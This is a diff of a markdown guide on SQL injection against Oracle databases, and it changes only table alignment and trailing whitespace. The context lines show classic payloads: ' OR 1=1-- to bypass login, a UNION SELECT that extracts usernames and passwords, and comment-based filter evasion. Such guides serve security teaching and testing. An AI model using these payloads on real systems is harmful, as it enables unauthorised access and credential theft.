@@ -15,10 +15,10 @@ When performing SQL injection attacks against Oracle databases, commenting out t
 
 Oracle supports two primary methods for commenting out query parts:
 
-| Comment Type | Syntax | Description |
-|--------------|--------|-------------|
-| Single-line comment | `--` | Comments out everything to the end of the line |
-| Block comment | `/* ... */` | Can span multiple lines |
+| Comment Type        | Syntax      | Description                                    |
+| ------------------- | ----------- | ---------------------------------------------- |
+| Single-line comment | `--`        | Comments out everything to the end of the line |
+| Block comment       | `/* ... */` | Can span multiple lines                        |
 
 ### Single-Line Comments
 
@@ -64,7 +64,7 @@ SELECT user_id, username /* , password */ FROM users
 SELECT * FROM users WHERE username = 'input1' AND password = 'input2'
 
 -- Injection with comment:
-' OR 1=1--  
+' OR 1=1--
 
 -- Resulting query:
 SELECT * FROM users WHERE username = '' OR 1=1--  ' AND password = 'input2'
@@ -77,10 +77,10 @@ SELECT * FROM users WHERE username = '' OR 1=1--  ' AND password = 'input2'
 SELECT article_id, title, content FROM articles WHERE article_id = 'input'
 
 -- Injection with comment:
--1 UNION SELECT username, password, null FROM users--  
+-1 UNION SELECT username, password, null FROM users--
 
 -- Resulting query:
-SELECT article_id, title, content FROM articles WHERE article_id = -1 UNION SELECT username, password, null FROM users--  
+SELECT article_id, title, content FROM articles WHERE article_id = -1 UNION SELECT username, password, null FROM users--
 ```
 
 ### Oracle-Specific Notes
@@ -103,7 +103,7 @@ For complex queries with multiple conditions, commenting is essential:
 SELECT * FROM products WHERE category_id = 'input' AND active = 1 AND price > 0
 
 -- Injection with comment to bypass additional conditions
-' OR 1=1--  
+' OR 1=1--
 
 -- Resulting query
 SELECT * FROM products WHERE category_id = '' OR 1=1--  ' AND active = 1 AND price > 0
@@ -115,7 +115,7 @@ If single quotes are filtered, you might be able to use comment handling:
 
 ```sql
 -- Using comments to build the payload without quotes
-SELECT/**/username/**/FROM/**/users/**/WHERE/**/user_id=1--  
+SELECT/**/username/**/FROM/**/users/**/WHERE/**/user_id=1--
 ```
 
 #### Multi-Line Statement Handling
@@ -127,6 +127,5 @@ Oracle's PL/SQL blocks can be complicated, and sometimes you need block comments
 complex
 multi-line
 logic
-*/--  
+*/--
 ```
-
